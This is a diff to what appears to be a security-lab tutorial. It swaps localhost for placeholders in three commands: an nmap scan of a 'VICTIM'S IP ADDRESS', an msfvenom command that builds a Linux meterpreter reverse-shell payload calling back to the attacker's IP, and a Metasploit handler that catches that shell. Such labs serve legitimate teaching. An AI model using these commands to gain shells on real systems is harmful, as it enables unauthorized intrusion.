@@ -40,7 +40,7 @@ Nmap version 7.93 ( https://nmap.org )
 Scan your local system to see open ports and service versions:
 
 ```bash
-nmap -sV -p- 127.0.0.1
+nmap -sV -p- "VICTIM'S IP ADDRESS"
 ```
 
 *   `-sV` → Detect service/version
@@ -60,7 +60,7 @@ Example Output (conceptual):
 Objective: Understand how attackers deliver a reverse shell using `msfvenom`.
 
 ```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell64.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="YOUR IP ADDRESS" LPORT=4444 -f elf -o shell64.elf
 chmod +x shell64.elf
 ```
 
@@ -88,7 +88,7 @@ Configure handler:
 ```bash
 use exploit/multi/handler
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
-set LHOST 127.0.0.1
+set LHOST "YOUR IP ADDRESS"
 set LPORT 4444
 run
 ```
